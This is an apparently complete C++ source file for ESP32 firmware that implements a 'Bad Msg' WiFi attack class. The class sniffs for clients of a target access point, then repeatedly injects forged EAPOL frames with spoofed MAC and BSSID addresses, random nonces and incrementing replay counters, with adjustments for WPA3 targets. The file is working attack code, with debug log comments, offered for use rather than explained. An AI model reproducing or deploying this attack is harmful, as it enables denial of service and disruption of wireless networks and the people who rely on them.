#include "BadMsgAttacker.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h" // For RawFrames

BadMsgAttacker::BadMsgAttacker() 
    : app_(nullptr), stationSniffer_(nullptr), isActive_(false), isAttackPending_(false),
      packetCounter_(0), lastPacketTime_(0), isSniffing_(false), currentClientIndex_(0) {}

void BadMsgAttacker::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

void BadMsgAttacker::prepareAttack(AttackType type) {
    if (isActive_) stop();
    isAttackPending_ = true;
    currentConfig_.type = type;
    // LOG 1: Check if the attack is being prepared correctly.
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "Attack prepared with type: %d", (int)type);
}

bool BadMsgAttacker::start(const WifiNetworkInfo& targetAp) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::TARGET_AP) return false;

    // LOG 2: Check if the TARGET_AP start function is being entered.
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "Starting TARGET_AP attack on %s", targetAp.ssid);
    currentConfig_.targetAp = targetAp;
    packetCounter_ = 0;
    isSniffing_ = true;
    currentClientIndex_ = 0;

    if (!stationSniffer_->start(targetAp)) {
        LOG(LogLevel::ERROR, "BAD_MSG_DBG", "Station sniffer failed to start. Aborting attack.");
        return false;
    }

    isActive_ = true;
    isAttackPending_ = false;
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "TARGET_AP attack is now active and sniffing.");
    return true;
}

bool BadMsgAttacker::start(const StationInfo& targetClient) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::PINPOINT_CLIENT) return false;
    
    // LOG 3: Check if the PINPOINT_CLIENT start function is being entered.
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "Starting PINPOINT_CLIENT attack.");

    currentConfig_.targetClient = targetClient;
    currentConfig_.targetAp.channel = targetClient.channel;
    memcpy(currentConfig_.targetAp.bssid, targetClient.ap_bssid, 6);

    bool ap_info_found = false;
    for (const auto& net : app_->getWifiManager().getScannedNetworks()) {
        if (memcmp(net.bssid, targetClient.ap_bssid, 6) == 0) {
            currentConfig_.targetAp.securityType = net.securityType;
            ap_info_found = true;
            // LOG 4: Confirm we found the security type.
            LOG(LogLevel::INFO, "BAD_MSG_DBG", "Found AP info. Security Type: %d", net.securityType);
            break;
        }
    }
    if (!ap_info_found) {
        LOG(LogLevel::WARN, "BAD_MSG_DBG", "Could not find AP in scan results. Assuming WPA2.");
        currentConfig_.targetAp.securityType = WIFI_AUTH_WPA2_PSK; // Fallback
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        // LOG 5: Critical check for hardware lock failure.
        LOG(LogLevel::ERROR, "BAD_MSG_DBG", "Failed to acquire RF lock for pinpoint attack.");
        return false;
    }
    
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "RF lock acquired successfully for pinpoint.");
    isActive_ = true;
    isAttackPending_ = false;
    packetCounter_ = 0;
    return true;
}

void BadMsgAttacker::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BAD_MSG_DBG", "Stopping Bad Msg attack.");
    isActive_ = false;
    isAttackPending_ = false;
    
    if (stationSniffer_->isActive()) {
        stationSniffer_->stop();
    }
    rfLock_.reset(); 
}

void BadMsgAttacker::loop() {
    if (!isActive_) return;

    // LOG 6: Check if the main loop is running.
    // Use 'false' to prevent this from spamming the SD card log.
    // LOG(LogLevel::DEBUG, "BAD_MSG_DBG", false, "Loop running...");

    if (millis() - lastPacketTime_ < 200) { 
        return;
    }
    lastPacketTime_ = millis();

    if (currentConfig_.type == AttackType::PINPOINT_CLIENT) {
        sendBadMsgPacket(currentConfig_.targetClient, currentConfig_.targetAp.securityType);
    } else if (currentConfig_.type == AttackType::TARGET_AP) {
        const auto& clients = stationSniffer_->getFoundStations();
        if (clients.empty()) {
            isSniffing_ = true;
            // LOG 7: Check if we are stuck waiting for clients.
            LOG(LogLevel::INFO, "BAD_MSG_DBG", false, "No clients found yet, continuing to sniff...");
            return;
        }
        
        if (isSniffing_) {
            // LOG 8: First time we find clients, acquire the lock.
            LOG(LogLevel::INFO, "BAD_MSG_DBG", "Found %d client(s). Stopping sniffer and acquiring RF lock.", clients.size());
            stationSniffer_->stop(); // Release the sniffer's promiscuous lock
            rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
            if (!rfLock_ || !rfLock_->isValid()) {
                LOG(LogLevel::ERROR, "BAD_MSG_DBG", "Failed to acquire RF lock for TARGET_AP attack. Stopping.");
                stop();
                return;
            }
            isSniffing_ = false;
        }
        
        if (currentClientIndex_ >= (int)clients.size()) {
            currentClientIndex_ = 0;
        }
        
        sendBadMsgPacket(clients[currentClientIndex_], currentConfig_.targetAp.securityType);       
        currentClientIndex_++;
    }
}

void BadMsgAttacker::sendBadMsgPacket(const StationInfo& client, uint8_t securityType) {
    // LOG 9: This is the most important log. Does it ever get here?
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
    LOG(LogLevel::INFO, "BAD_MSG_DBG", false, "Calling sendBadMsgPacket for client %s on channel %d", macStr, client.channel);

    esp_wifi_set_channel(client.channel, WIFI_SECOND_CHAN_NONE);
    delay(1);

    uint8_t packet[sizeof(RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE)];
    memcpy(packet, RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE, sizeof(packet));
    size_t frame_size = sizeof(packet);

    memcpy(&packet[4], client.mac, 6);      
    memcpy(&packet[10], client.ap_bssid, 6); 
    memcpy(&packet[16], client.ap_bssid, 6); 
    esp_fill_random(&packet[49], 32);

    for (uint8_t i = 0; i < 8; i++) {
        packet[41 + i] = (packetCounter_ >> (56 - i * 8)) & 0xFF;
    }

    if (securityType == WIFI_AUTH_WPA3_PSK || securityType == WIFI_AUTH_WPA2_WPA3_PSK || securityType == WIFI_AUTH_WPA3_ENT_192) {
        LOG(LogLevel::DEBUG, "BAD_MSG_DBG", false, "Target is WPA3. Adjusting EAPOL frame.");
        packet[35] = 0x5f;  
        packet[38] = 0xCB;  
        packet[39] = 0x00;  
        packet[40] = 0x00;  
        frame_size -= 22;   
    }
    
    // LOG 10: Check the result of the actual transmission function.
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, packet, frame_size, false);
    if (result == ESP_OK) {
        packetCounter_++;
    } else {
        LOG(LogLevel::ERROR, "BAD_MSG_DBG", false, "esp_wifi_80211_tx failed! Error code: %d", result);
    }
}

// Getters (no changes needed)
bool BadMsgAttacker::isActive() const { return isActive_; }
const BadMsgAttacker::AttackConfig& BadMsgAttacker::getConfig() const { return currentConfig_; }
uint32_t BadMsgAttacker::getPacketCount() const { return packetCounter_; }
int BadMsgAttacker::getClientCount() const {
    return (currentConfig_.type == AttackType::PINPOINT_CLIENT) ? 1 : stationSniffer_->getFoundStations().size();
}
bool BadMsgAttacker::isSniffing() const { return isSniffing_; }